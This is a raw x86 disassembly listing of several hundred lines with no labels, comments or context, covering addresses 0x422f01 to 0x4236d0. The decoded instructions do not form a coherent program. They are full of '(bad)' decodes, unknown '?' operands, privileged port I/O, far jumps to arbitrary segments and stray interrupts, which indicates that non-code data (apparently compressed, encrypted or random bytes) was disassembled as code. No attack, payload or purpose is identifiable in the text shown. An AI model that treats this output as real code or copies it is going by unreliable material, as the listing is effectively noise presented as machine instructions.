  422f01:	mov    dl,0xb9
  422f03:	push   ebp
  422f04:	ds jo  0x422eae
  422f07:	inc    eax
  422f08:	adc    BYTE PTR [ecx+0x37],cl
  422f0b:	sar    BYTE PTR [esi],cl
  422f0d:	and    cl,BYTE PTR [ebx]
  422f0f:	lods   eax,DWORD PTR ds:[esi]
  422f10:	push   ss
  422f11:	imul   esp,DWORD PTR [ebp+0x4f],0x22
  422f15:	lods   al,BYTE PTR ds:[esi]
  422f16:	jnp    0x422ea4
  422f18:	xlat   BYTE PTR ds:[ebx]
  422f19:	in     eax,dx
  422f1a:	js     0x422ed8
  422f1c:	repnz stc 
  422f1e:	xor    ebp,DWORD PTR [esi-0xf79ad92]
  422f24:	adc    al,0xaf
  422f26:	ret    
  422f27:	sub    al,0xad
  422f29:	sub    esi,DWORD PTR [edx-0x4fa4facd]
  422f2f:	lock test al,0xc4
  422f32:	mov    edi,0xc96b20d5
  422f37:	(bad)  
  422f38:	loope  0x422eed
  422f3a:	add    al,ah
  422f3c:	cli    
  422f3d:	pop    ds
  422f3e:	outs   dx,BYTE PTR ds:[esi]
  422f3f:	adc    eax,0x2fa47f8a
  422f44:	retf   
  422f45:	cwde   
  422f46:	xor    DWORD PTR [edi],ebp
  422f48:	jge    0x422f52
  422f4a:	adc    eax,0x42c210d0
  422f4f:	das    
  422f50:	xchg   ecx,eax
  422f51:	mov    ds:0xfe917749,al
  422f56:	cmp    eax,0xed88adc7
  422f5b:	add    ah,ah
  422f5d:	xor    BYTE PTR [eax+ebx*2+0x53],0x4a
  422f62:	xchg   esi,eax
  422f63:	or     al,0xec
  422f65:	fidiv  WORD PTR [ecx]
  422f67:	sti    
  422f68:	jno    0x422f82
  422f6a:	sbb    BYTE PTR [edx],ch
  422f6c:	mov    dh,0x69
  422f6e:	mov    fs:0xa1db7715,eax
  422f74:	dec    esp
  422f75:	or     eax,0xa88c94ec
  422f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f7b:	out    0xc4,eax
  422f7d:	mov    ds:0x15f0ae51,eax
  422f82:	nop
  422f83:	int    0xbb
  422f85:	cmovg  ebx,esi
  422f88:	mov    ds:0x959d947,al
  422f8d:	jne    0x422fd0
  422f8f:	test   DWORD PTR ds:0x339342a4,eax
  422f95:	xchg   ecx,eax
  422f96:	push   0x5f
  422f98:	mov    esi,eax
  422f9a:	bound  edi,QWORD PTR [eax-0x384e3dd7]
  422fa0:	mov    ah,0x7f
  422fa2:	pop    edi
  422fa3:	outs   dx,WORD PTR ds:[esi]
  422fa5:	mov    dh,BYTE PTR [ebp-0x70]
  422fa8:	shl    esp,0xde
  422fab:	xchg   esp,eax
  422fac:	stos   DWORD PTR es:[edi],eax
  422fad:	sub    ch,BYTE PTR [ebx+eiz*4+0x70]
  422fb1:	ins    DWORD PTR es:[edi],dx
  422fb2:	outs   dx,BYTE PTR ds:[esi]
  422fb3:	stos   DWORD PTR es:[edi],eax
  422fb4:	jne    0x422f63
  422fb6:	mov    bl,0xf6
  422fb8:	push   esi
  422fb9:	inc    ebx
  422fba:	push   DWORD PTR [edi-0x6ffa3808]
  422fc0:	xchg   edi,eax
  422fc1:	sub    BYTE PTR [edi-0x7917de],bh
  422fc7:	mov    dh,0xa8
  422fc9:	ud1    esi,DWORD PTR [eax]
  422fcc:	rcr    BYTE PTR [eax-0x699e8a30],cl
  422fd2:	int3   
  422fd3:	pop    ds
  422fd4:	dec    eax
  422fd5:	sub    al,0x23
  422fd7:	(bad)
  422fdc:	fs dec edi
  422fde:	jno    0x422fd5
  422fe0:	enter  0xe586,0xc7
  422fe4:	sbb    edx,DWORD PTR [edi-0x4]
  422fe7:	add    BYTE PTR ds:[eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422f8a
  422ff7:	dec    edx
  422ff8:	inc    eax
  422ff9:	pop    edi
  422ffa:	mov    WORD PTR [esi+0x6860001],?
  423000:	add    BYTE PTR [eax],al
  423002:	outs   dx,DWORD PTR ds:[esi]
  423003:	cdq    
  423004:	mov    ah,0xb6
  423006:	inc    ecx
  423007:	cs sbb eax,0xb84d1194
  42300d:	test   DWORD PTR [eax-0x618b74e6],ebx
  423013:	xchg   edx,eax
  423014:	or     edi,DWORD PTR [edi+0x43]
  423017:	rcr    ebp,1
  423019:	mov    edx,0xc9dfcd7b
  42301e:	pop    es
  42301f:	fwait
  423020:	adc    eax,0x61803360
  423025:	sub    esi,DWORD PTR [eax]
  423027:	fstp   DWORD PTR [eax]
  423029:	daa    
  42302a:	lahf   
  42302b:	fldcw  WORD PTR ds:0x22b8e93e
  423031:	mov    bl,0xf6
  423033:	loope  0x42300d
  423035:	test   eax,0x46bdf93c
  42303a:	xlat   BYTE PTR ds:[ebx]
  42303b:	inc    ebx
  42303c:	push   es
  42303d:	rol    al,1
  42303f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423040:	mov    dh,0x7a
  423042:	jb     0x42303d
  423044:	jmp    0x6943:0xc3edf851
  42304b:	mov    cl,BYTE PTR [ebp-0x144a8f69]
  423051:	or     BYTE PTR [ebx-0x61d3b57e],dh
  423057:	arpl   WORD PTR [edx+0x58],sp
  42305a:	mov    edx,0xcf0c84c4
  42305f:	pop    esp
  423060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423061:	add    DWORD PTR [esi-0x2b23fe2f],ebx
  423067:	leave  
  423068:	std    
  423069:	into   
  42306a:	sbb    al,0x30
  42306c:	clc    
  42306d:	retf   0x190c
  423070:	fs scas eax,DWORD PTR es:[edi]
  423072:	mov    ds:0x91496733,al
  423077:	xor    eax,0x23cbe765
  42307c:	and    al,0x66
  42307e:	cmp    DWORD PTR ds:0x73f73c1e,edi
  423084:	or     DWORD PTR [eax-0x695a2f5f],ebx
  42308a:	imul   ecx,DWORD PTR [ebx-0x2a],0x3
  42308e:	jmp    0xa8047d3b
  423093:	fld    QWORD PTR [eax]
  423095:	push   ebx
  423096:	sub    al,bl
  423098:	fs aad 0xb7
  42309b:	iret   
  42309c:	or     BYTE PTR [eax],dh
  42309e:	xchg   esi,eax
  42309f:	out    dx,eax
  4230a0:	scas   al,BYTE PTR es:[edi]
  4230a1:	daa    
  4230a2:	mov    al,ds:0x63808668
  4230a7:	adc    dh,dl
  4230a9:	xchg   ebp,eax
  4230aa:	or     BYTE PTR [edi],dl
  4230ac:	das    
  4230ad:	mov    ebx,0xbc33dea0
  4230b2:	push   0xffffffd1
  4230b4:	pop    ebx
  4230b5:	inc    edi
  4230b6:	jae    0x423134
  4230b8:	xchg   edi,eax
  4230b9:	push   ds
  4230ba:	dec    eax
  4230bb:	xchg   DWORD PTR [eax],ebp
  4230bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230be:	inc    ebp
  4230bf:	mov    edi,0x3dbb377e
  4230c4:	call   0xe6effc88
  4230c9:	or     ch,ah
  4230cb:	(bad)  
  4230cc:	daa    
  4230cd:	int    0x3e
  4230cf:	loopne 0x423113
  4230d1:	xor    BYTE PTR [esi+0x38aec74d],dh
  4230d7:	ficomp WORD PTR [eax+0x1e]
  4230da:	call   0x9b:0xae3f4d62
  4230e1:	fdivr  QWORD PTR [esi+ebp*1-0x6e2ef322]
  4230e8:	jg     0x4230c8
  4230ea:	sbb    esi,DWORD PTR [ecx-0xb065643]
  4230f0:	ss jmp 0x5fe6:0xc08750f1
  4230f8:	inc    edi
  4230f9:	lea    ebp,[edx-0x57]
  4230fc:	cs push ss
  4230fe:	mov    bh,0x75
  423100:	outs   dx,DWORD PTR ds:[esi]
  423101:	into   
  423102:	ret    
  423103:	add    al,0x6c
  423105:	push   edi
  423106:	add    DWORD PTR [ecx-0x17a97676],esp
  42310c:	or     BYTE PTR [ecx+0x4ce16c67],0x43
  423113:	adc    al,bh
  423115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423116:	cld    
  423117:	(bad)  
  423118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423119:	or     BYTE PTR [edx],ah
  42311b:	int3   
  42311c:	rol    BYTE PTR [esi+0x73],cl
  42311f:	repz mov cl,0x4a
  423122:	and    al,0x20
  423124:	jb     0x42312b
  423126:	jle    0x42314a
  423128:	popf   
  423129:	cdq    
  42312a:	sub    ch,BYTE PTR [esi-0x9]
  42312d:	ret    0xaf64
  423130:	pusha  
  423131:	lahf   
  423132:	mov    al,ds:0x561f7296
  423137:	out    0x81,eax
  423139:	f2xm1  
  42313b:	stos   DWORD PTR es:[edi],eax
  42313c:	(bad)
  42313f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423140:	sbb    al,0x80
  423142:	or     BYTE PTR [ecx],dl
  423144:	add    eax,0xa0eaea09
  423149:	mov    dl,0x2
  42314b:	jecxz  0x423162
  42314d:	enter  0x5ddd,0x5
  423151:	sub    eax,0xa8c1e43b
  423156:	add    al,0x18
  423158:	jle    0x423152
  42315a:	data16 and BYTE PTR [ebp-0x33],0x11
  42315f:	pushf  
  423160:	pop    ecx
  423161:	pop    ecx
  423162:	jmp    0x423169
  423164:	dec    ecx
  423165:	or     dl,dl
  423167:	shr    BYTE PTR [ecx+0xd],1
  42316a:	int    0x1
  42316c:	test   ah,cl
  42316e:	mov    edx,0xb9eeea22
  423173:	jmp    0xfba61727
  423178:	or     eax,0x7c4413d9
  42317d:	xchg   ebp,eax
  42317e:	and    al,0x9
  423180:	jp     0x4231d9
  423182:	dec    edi
  423183:	or     eax,0xb2feff5d
  423188:	pop    esi
  423189:	mov    eax,ds:0x85b286b4
  42318f:	aaa    
  423190:	out    dx,eax
  423191:	popf   
  423192:	pop    eax
  423193:	and    eax,0xb27e855c
  423198:	xor    cl,BYTE PTR [ecx+0x5dbacb1]
  42319e:	imul   esp,DWORD PTR [ecx],0xffffff90
  4231a1:	popa   
  4231a2:	mul    ah
  4231a4:	or     DWORD PTR ds:0x3f35c365,ebp
  4231aa:	std    
  4231ab:	fst    DWORD PTR [ebx+0x47ab6bf2]
  4231b1:	mov    BYTE PTR [edx+eiz*2-0x3b90efe3],ah
  4231b8:	fmul   DWORD PTR [eax]
  4231ba:	add    al,0x8e
  4231bc:	dec    edx
  4231bd:	inc    esp
  4231be:	pop    ebp
  4231bf:	aam    0x96
  4231c1:	sub    al,0xd1
  4231c3:	pop    ecx
  4231c4:	or     al,0xa8
  4231c6:	int    0xfa
  4231c8:	jbe    0x423234
  4231ca:	cs push 0x3d
  4231cd:	mov    edx,0x73c225b5
  4231d2:	dec    esp
  4231d3:	icebp  
  4231d4:	xor    ah,BYTE PTR [eax-0x7c]
  4231d7:	push   ss
  4231d8:	ja     0x4231b8
  4231da:	cld    
  4231db:	add    DWORD PTR [eax+0x63cf1552],esi
  4231e1:	or     BYTE PTR [ebx-0x6a4913cf],bl
  4231e7:	push   cs
  4231e8:	pop    esp
  4231e9:	pop    eax
  4231ea:	arpl   WORD PTR [edx+0x1c973064],cx
  4231f0:	xchg   esp,eax
  4231f1:	fwait
  4231f2:	dec    esi
  4231f3:	ins    DWORD PTR es:[edi],dx
  4231f4:	je     0x4231f4
  4231f6:	ficom  WORD PTR [ecx-0x47958f62]
  4231fc:	sbb    bh,BYTE PTR [eax+ebx*8]
  4231ff:	mov    dh,BYTE PTR [ebx-0x3f5cb8bc]
  423205:	cwde   
  423206:	sti    
  423207:	aas    
  423208:	lds    esp,FWORD PTR [ecx-0xa]
  42320b:	sbb    BYTE PTR [edi],ah
  42320d:	sub    DWORD PTR [edi-0x3557ae04],ebx
  423213:	push   esi
  423214:	(bad)  
  423215:	das    
  423216:	call   0x68fc:0x52ca8e66
  42321d:	(bad)  
  42321e:	aaa    
  42321f:	or     BYTE PTR [ecx],0x70
  423222:	xor    bl,bl
  423224:	enter  0x184a,0xba
  423228:	cwde   
  423229:	imul   edi,ebx,0xffffffd5
  42322c:	adc    eax,ebx
  42322e:	jle    0x423266
  423230:	es cld 
  423232:	les    esp,FWORD PTR [ebx]
  423234:	jbe    0x423234
  423236:	les    edx,FWORD PTR [ebx]
  423238:	sub    BYTE PTR [ebx+0x49e719ea],ch
  42323e:	mov    ebp,?
  423240:	test   BYTE PTR [ebx],ah
  423242:	inc    esi
  423243:	jne    0x423291
  423245:	jecxz  0x4232b0
  423247:	cmp    al,0x35
  423249:	jmp    0x1892:0xa2c93110
  423250:	adc    al,0xaa
  423252:	js     0x423214
  423254:	xrelease mov BYTE PTR [ebp-0x4f],dh
  423258:	pop    eax
  423259:	es mov eax,0xd2c6e9af
  42325f:	imul   esp,DWORD PTR [edi-0x3d4c6ff9],0xb9866fa9
  423269:	or     bl,BYTE PTR [esi-0x7e]
  42326c:	das    
  42326d:	sbb    BYTE PTR [ecx],ch
  42326f:	cmp    BYTE PTR [edi],cl
  423271:	or     al,0x82
  423273:	imul   edx,edx,0xc
  423276:	rcl    eax,0x71
  423279:	aas    
  42327a:	aam    0x7b
  42327c:	ins    BYTE PTR es:[edi],dx
  42327d:	clc    
  42327e:	xchg   ebp,eax
  42327f:	push   cs
  423280:	jge    0x423250
  423282:	pusha  
  423283:	mov    edx,0x9ef2cb31
  423288:	push   ebp
  423289:	push   ebp
  42328a:	mov    bh,0xd1
  42328c:	fcomp  DWORD PTR [ebx+edx*4-0x54]
  423290:	pusha  
  423291:	repz sbb bl,bl
  423294:	xchg   DWORD PTR [ebx-0x46ac984c],ecx
  42329a:	jp     0x423223
  42329c:	pushf  
  42329d:	jge    0x423270
  42329f:	push   ss
  4232a0:	mov    DWORD PTR [esi+ebx*8+0x178f8aad],esp
  4232a7:	mov    al,0x96
  4232a9:	and    BYTE PTR [esi-0x9b07b1f],dl
  4232af:	mul    BYTE PTR [edi-0x4535e101]
  4232b5:	xlat   BYTE PTR ds:[ebx]
  4232b6:	dec    BYTE PTR [ebp-0x6a]
  4232b9:	pop    esp
  4232ba:	div    BYTE PTR [edi-0x6b]
  4232bd:	adc    eax,0x901b2bb2
  4232c2:	xchg   edi,eax
  4232c3:	ret    
  4232c4:	sbb    bh,BYTE PTR [ebx-0x1ded2bce]
  4232ca:	xchg   DWORD PTR [ebp+0x6f],eax
  4232cd:	jns    0x4232f2
  4232cf:	loopne 0x42327d
  4232d1:	sbb    bl,BYTE PTR [eax-0x5d760891]
  4232d7:	xchg   edx,eax
  4232d8:	add    al,0x19
  4232da:	stos   BYTE PTR es:[edi],al
  4232db:	pop    ecx
  4232dc:	xchg   esi,eax
  4232dd:	lds    edi,FWORD PTR [esi]
  4232df:	adc    DWORD PTR [ebp-0x67],ebp
  4232e2:	sub    ah,BYTE PTR [ebp-0x4e42b6bb]
  4232e8:	and    ebx,DWORD PTR [esi]
  4232ea:	fsubr  DWORD PTR [edx+eax*4-0x40]
  4232ee:	add    bl,BYTE PTR [ebx+eax*2-0x3d]
  4232f2:	mov    ?,WORD PTR [eax+eax*2-0x5580be45]
  4232f9:	into   
  4232fa:	cmc    
  4232fb:	add    eax,0x641846a3
  423300:	aam    0x90
  423302:	mov    bl,0xdb
  423304:	aad    0xa1
  423306:	loopne 0x42336a
  423308:	(bad)  
  423309:	stos   BYTE PTR es:[edi],al
  42330a:	cmp    eax,0x5fa27e30
  42330f:	shl    BYTE PTR [ebp-0x6d39d0b3],0xb7
  423316:	mov    edi,ebx
  423318:	js     0x4232d1
  42331a:	dec    edx
  42331b:	adc    bh,ch
  42331d:	push   edx
  42331e:	jle    0x42338a
  423320:	sbb    ecx,eax
  423322:	ins    BYTE PTR es:[edi],dx
  423323:	inc    edx
  423324:	adc    BYTE PTR [esi],dl
  423326:	xor    al,0x24
  423328:	sub    ebp,DWORD PTR [edx-0x14]
  42332b:	xchg   esp,eax
  42332c:	cmp    BYTE PTR [ebp+0x41],dl
  42332f:	fstp   TBYTE PTR [edi+0x77]
  423332:	mov    DWORD PTR [edx],esp
  423334:	xlat   BYTE PTR ds:[ebx]
  423335:	jae    0x4232be
  423337:	jle    0x4232d7
  423339:	sub    eax,0x2c914960
  42333e:	xchg   cl,bl
  423340:	dec    BYTE PTR [esi-0x6a234b6a]
  423346:	jno    0x4233b3
  423348:	ss dec edx
  42334a:	adc    al,0xb8
  42334c:	mov    WORD PTR [ecx+0x33],gs
  42334f:	dec    ecx
  423350:	push   ebx
  423351:	mov    ah,0xfc
  423353:	inc    esi
  423354:	pop    ss
  423355:	(bad)  
  423357:	jne    0x423365
  423359:	fbld   TBYTE PTR [ecx-0x6e]
  42335c:	mov    ebx,0x5b86f04f
  423361:	(bad)  
  423362:	sub    DWORD PTR [edi+0x0],esi
  423365:	stos   BYTE PTR es:[edi],al
  423366:	retf   0x6cff
  423369:	in     eax,dx
  42336a:	jg     0x423360
  42336c:	push   ebx
  42336d:	ficom  DWORD PTR [esi-0x78]
  423370:	add    ebx,DWORD PTR [ecx+eiz*1+0x9]
  423374:	mov    cl,0x86
  423376:	mov    ebp,DWORD PTR [edi]
  423378:	pushf  
  423379:	call   0x67ad:0xedb9fc0e
  423380:	adc    al,0x3f
  423382:	cmp    DWORD PTR [esi+0x47],ecx
  423385:	mov    eax,ds:0xc9fcd79c
  42338a:	push   eax
  42338b:	imul   ebp,ecx,0xffffff9d
  42338e:	in     al,dx
  42338f:	adc    eax,0x9f520e07
  423394:	and    eax,0x610d963
  423399:	jo     0x42340b
  42339b:	aad    0x16
  42339d:	sar    BYTE PTR [eax],cl
  42339f:	cmp    al,0x85
  4233a1:	and    ebp,DWORD PTR [ebx]
  4233a3:	adc    al,0x8f
  4233a5:	pop    ecx
  4233a7:	sbb    eax,0x2775f7b2
  4233ac:	mov    cl,al
  4233ae:	ins    DWORD PTR es:[edi],dx
  4233af:	sbb    ch,BYTE PTR [eax+0x125a5bf6]
  4233b5:	scas   al,BYTE PTR es:[edi]
  4233b6:	push   esi
  4233b7:	bswap  esi
  4233b9:	inc    eax
  4233ba:	je     0x42334d
  4233bc:	mov    ah,0xc4
  4233be:	call   0x62b1:0x641888e
  4233c5:	fild   DWORD PTR [esi-0x2b]
  4233c8:	xlat   BYTE PTR ds:[ebx]
  4233c9:	sub    ebx,ebx
  4233cb:	js     0x423439
  4233cd:	xor    eax,0xe8111942
  4233d2:	xchg   DWORD PTR [ecx],ebx
  4233d4:	inc    ebp
  4233d5:	xor    dl,BYTE PTR [esi]
  4233d7:	ficomp WORD PTR [ebp+0x74486594]
  4233dd:	fstp   DWORD PTR [ebp-0x68]
  4233e0:	icebp  
  4233e1:	js     0x42345f
  4233e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233e4:	jle    0x42338d
  4233e6:	call   0x3599:0xef7b6d20
  4233ed:	fcom   QWORD PTR [edx-0x1b8fbdef]
  4233f3:	and    al,0x8d
  4233f5:	mov    cs,WORD PTR [esi+0x44071a17]
  4233fb:	dec    eax
  4233fc:	loopne 0x4233ce
  4233fe:	leave  
  4233ff:	in     eax,dx
  423400:	add    eax,0xa4c85356
  423405:	gs and eax,0x1d02d6c7
  42340b:	and    eax,DWORD PTR [ebx+0x3b]
  42340e:	mov    eax,0xb34f44b2
  423413:	in     al,0xa4
  423415:	shr    BYTE PTR [ebx],cl
  423417:	cmc    
  423418:	jne    0x423433
  42341a:	xor    dh,BYTE PTR [edx]
  42341c:	mov    cl,0x27
  42341e:	xchg   BYTE PTR [eax+0x2b],ah
  423421:	pop    es
  423422:	dec    eax
  423423:	iret   
  423424:	test   BYTE PTR [ecx-0x14],al
  423427:	cmc    
  423428:	jp     0x42343a
  42342a:	mov    edx,0x45b04c2f
  42342f:	sbb    edi,DWORD PTR [edx+0x6e]
  423432:	pop    ds
  423433:	add    bl,BYTE PTR [ecx]
  423435:	retf   
  423436:	inc    eax
  423437:	inc    esp
  423438:	mov    cl,0x61
  42343a:	enter  0x30ae,0x80
  42343e:	inc    ecx
  42343f:	sbb    al,0x85
  423441:	xchg   ebx,eax
  423442:	dec    esp
  423443:	sub    DWORD PTR [edx+ebp*8-0x2344405f],ecx
  42344a:	jle    0x4233de
  42344c:	(bad)  
  42344d:	lock sub ecx,DWORD PTR [edx-0x53]
  423451:	inc    ecx
  423452:	fwait
  423453:	cmc    
  423454:	mov    ds:0x27750d4e,eax
  423459:	and    al,0x68
  42345b:	jg     0x423460
  42345d:	mov    DWORD PTR [ebx],ebp
  42345f:	in     al,0xc9
  423461:	outs   dx,BYTE PTR ds:[esi]
  423462:	(bad)  
  423463:	call   FWORD PTR [edi-0x7e]
  423466:	(bad)  
  423467:	push   ebx
  423468:	cmp    cl,BYTE PTR [edi+0x48030ef6]
  42346e:	lods   al,BYTE PTR ds:[esi]
  42346f:	call   DWORD PTR [ebx]
  423471:	neg    BYTE PTR [edi+edx*1-0x38]
  423475:	fstp   QWORD PTR [edx-0x73]
  423478:	pop    eax
  423479:	pop    edi
  42347a:	out    0xc2,al
  42347c:	popf   
  42347d:	sahf   
  42347e:	ret    
  42347f:	sbb    eax,0x6bdfecaf
  423484:	leave  
  423485:	fnstsw WORD PTR [ecx+0x6]
  423488:	pop    es
  423489:	push   0x76ef80fb
  42348e:	xor    DWORD PTR [eax-0x6e44f206],esi
  423494:	in     eax,0xeb
  423496:	lahf   
  423497:	jmp    0xabb4df9b
  42349c:	jnp    0x4234ab
  42349e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42349f:	add    BYTE PTR [ebp+0x60628070],al
  4234a5:	sahf   
  4234a6:	add    dh,BYTE PTR [ecx+0x4a]
  4234a9:	iret   
  4234aa:	ins    DWORD PTR es:[edi],dx
  4234ab:	das    
  4234ac:	and    ah,bh
  4234ae:	dec    ebp
  4234af:	cmp    ebx,esi
  4234b1:	clc    
  4234b2:	jge    0x42349a
  4234b4:	(bad)  
  4234b5:	dec    ecx
  4234b6:	xor    ch,BYTE PTR [esp+edi*4+0x77]
  4234ba:	mov    cl,cl
  4234bc:	or     edx,0xffffffe3
  4234bf:	mov    ds:0x6b437e5b,al
  4234c4:	stc    
  4234c5:	xor    DWORD PTR fs:[esi],edi
  4234c8:	mov    al,ds:0x33cc44e8
  4234cd:	pop    esi
  4234ce:	xchg   BYTE PTR [esi],cl
  4234d0:	(bad)  
  4234d1:	jg     0x42350d
  4234d3:	sub    BYTE PTR [ebp-0x2c26631f],cl
  4234d9:	ins    DWORD PTR es:[edi],dx
  4234da:	push   ebx
  4234db:	es xor di,0xd2db
  4234e1:	lods   al,BYTE PTR ds:[esi]
  4234e2:	cmp    BYTE PTR [eax+edx*1-0x21],al
  4234e6:	inc    ebx
  4234e7:	mov    edi,0x34ce724
  4234ec:	push   0xe3095fb4
  4234f1:	and    edi,DWORD PTR [ecx+0x4f]
  4234f4:	pop    ecx
  4234f5:	sbb    DWORD PTR [eax+edi*8],esi
  4234f8:	mov    esp,ecx
  4234fa:	xlat   BYTE PTR ds:[ebx]
  4234fb:	add    dl,BYTE PTR [ecx+edi*4]
  4234fe:	adc    BYTE PTR [ebx+0x68],bh
  423501:	xchg   ecx,esp
  423503:	je     0x423491
  423505:	test   DWORD PTR [eax],ebp
  423507:	push   eax
  423508:	mov    dh,0x71
  42350a:	rcr    bh,0xfa
  42350d:	pop    ebp
  42350e:	push   ebx
  42350f:	xchg   DWORD PTR [ecx+0x3636bd0],ecx
  423515:	andps  xmm2,XMMWORD PTR [edi]
  423518:	jbe    0x4234b6
  42351a:	xor    eax,0xdc681c6b
  42351f:	push   0x1646054c
  423524:	adc    bh,bl
  423526:	in     eax,dx
  423527:	sbb    ch,BYTE PTR [eax-0x53f6c93f]
  42352d:	(bad)  
  42352e:	sub    ah,BYTE PTR [eax-0x2]
  423531:	mov    edi,0xeb7e00a5
  423536:	clc    
  423537:	or     DWORD PTR [edi+ebx*4],edx
  42353a:	hlt    
  42353b:	pushf  
  42353c:	pushw  ds
  42353e:	jb     0x42358f
  423540:	cli    
  423541:	les    edi,FWORD PTR [ebx+0x4b7494fc]
  423547:	cmp    DWORD PTR [ebp-0x59],0x9434df20
  42354e:	mov    DWORD PTR [edi-0x7a51cea3],edi
  423554:	or     esi,DWORD PTR [esi-0x49]
  423557:	xor    BYTE PTR [ebx],0x53
  42355a:	mov    ebp,0x5d69a153
  42355f:	aad    0x3c
  423561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423562:	pop    eax
  423563:	into   
  423564:	retf   0x6136
  423567:	dec    cl
  423569:	lahf   
  42356a:	push   ebx
  42356b:	inc    ebp
  42356c:	in     al,0x7a
  42356e:	out    dx,eax
  42356f:	jo     0x423540
  423571:	stos   BYTE PTR es:[edi],al
  423572:	or     BYTE PTR [edi],ch
  423574:	ss pop es
  423576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423577:	push   0x973bc206
  42357c:	(bad)  
  42357d:	sar    BYTE PTR [edi+edi*8-0x74],1
  423581:	call   0xe6bdbd9f
  423586:	scas   eax,DWORD PTR es:[edi]
  423587:	pinsrw mm3,WORD PTR [ebx+0x46],0x7a
  42358c:	out    dx,al
  42358d:	mov    edi,0x9c3fe9de
  423592:	das    
  423593:	push   cs
  423594:	mov    ch,cl
  423596:	adc    DWORD PTR [edx+0x25c44b1],0x55
  42359d:	mov    ds:0x4b3a046e,al
  4235a2:	mov    bh,bh
  4235a4:	jnp    0x423566
  4235a6:	inc    ecx
  4235a7:	idiv   DWORD PTR [ecx-0x3ecaa73e]
  4235ad:	jne    0x423621
  4235af:	into   
  4235b0:	dec    edx
  4235b1:	pop    ebp
  4235b2:	nop
  4235b3:	xor    eax,0xfdcfd403
  4235b8:	cwde   
  4235b9:	add    BYTE PTR [edx+0x3fdbca9d],0x9b
  4235c0:	lahf   
  4235c1:	repz mov edx,0x6f367ef2
  4235c7:	ror    DWORD PTR [ebp+0x4b],1
  4235ca:	pop    ds
  4235cb:	ds add eax,0x5ef00e4b
  4235d1:	aas    
  4235d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235d3:	jnp    0x4235c5
  4235d5:	fld    DWORD PTR [ecx+0x257420b0]
  4235db:	xor    DWORD PTR [eax+0x7bfebf7e],edi
  4235e1:	jecxz  0x4235ae
  4235e3:	sub    al,BYTE PTR [esi-0x2e1a5bb9]
  4235e9:	imul   edx,esi,0x1
  4235ec:	out    0x3a,eax
  4235ee:	sub    edx,DWORD PTR [edx+0x79]
  4235f1:	push   ebx
  4235f2:	xchg   edi,eax
  4235f3:	or     BYTE PTR [ecx+0x4129aefa],bl
  4235f9:	mov    al,0x7c
  4235fb:	mov    eax,0x7125c39b
  423600:	sub    DWORD PTR [ecx],edx
  423602:	push   esi
  423603:	test   ah,bh
  423605:	add    al,0xbf
  423607:	ss mov ch,0x98
  42360a:	popa   
  42360b:	pop    eax
  42360c:	in     al,0x7d
  42360e:	les    esi,FWORD PTR [ebx-0x680081d2]
  423614:	and    eax,0xac1bb320
  423619:	sub    eax,0xecfd830b
  42361e:	cli    
  42361f:	ins    BYTE PTR es:[edi],dx
  423620:	xchg   edi,eax
  423621:	dec    esp
  423622:	mov    bl,0xdb
  423624:	xchg   DWORD PTR [ebx],eax
  423626:	jecxz  0x4235e1
  423628:	mov    ds:0x1ac06a09,eax
  42362d:	or     al,0x72
  42362f:	add    eax,edx
  423631:	loope  0x423623
  423633:	sub    eax,0x62e7148d
  423638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423639:	inc    edx
  42363a:	or     DWORD PTR [ebp+0x11b1755c],edi
  423640:	rcr    DWORD PTR [edi+0x30a9aba0],0x68
  423647:	fldenv [ecx]
  423649:	inc    ecx
  42364a:	idiv   BYTE PTR [eax+0x5e]
  42364d:	xor    ebx,esp
  42364f:	mov    ds:0x5994e8fc,eax
  423654:	and    BYTE PTR [ebx-0x10],dh
  423657:	rol    DWORD PTR [ecx-0x10591a5],0x20
  42365e:	mov    ebx,0xa88b45fd
  423663:	pop    eax
  423664:	fisttp WORD PTR [esi+0x6e901f71]
  42366a:	imul   ebp,DWORD PTR [edx-0x57859c9d],0x4a
  423671:	(bad)  
  423672:	shr    DWORD PTR [eax+0x5caae6de],cl
  423678:	test   BYTE PTR [edx+0x36],cl
  42367b:	adc    BYTE PTR [eax+edi*1],bl
  42367e:	sub    bh,BYTE PTR [ecx-0x62]
  423681:	call   0xf684:0x4c57645a
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xd4a42923
  423697:	xchg   esp,eax
  423698:	out    0xfb,eax
  42369a:	adc    al,ch
  42369c:	add    DWORD PTR [eax],eax
  42369e:	xchg   BYTE PTR [esi],al
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	add    al,0x99
  4236a4:	dec    eax
  4236a5:	(bad)  
  4236a6:	fadd   st(0),st
  4236a8:	scas   eax,DWORD PTR es:[edi]
  4236a9:	lods   eax,DWORD PTR ds:[esi]
  4236aa:	aaa    
  4236ab:	fisub  DWORD PTR [edx-0x25dffaf9]
  4236b1:	sub    ah,BYTE PTR [esi]
  4236b3:	cmp    bh,BYTE PTR [eax+esi*1+0x41181e4c]
  4236ba:	add    eax,0xbd67c15a
  4236bf:	cld    
  4236c0:	push   0xffffffd4
  4236c2:	(bad)  
  4236c3:	fstp   DWORD PTR [edx]
  4236c5:	in     al,dx
  4236c6:	pop    ebx
  4236c7:	loop   0x4236fe
  4236c9:	jbe    0x42370e
  4236cb:	or     ah,BYTE PTR [esp+ecx*1]
  4236ce:	dec    edi
  4236cf:	icebp  
  4236d0:	lahf   
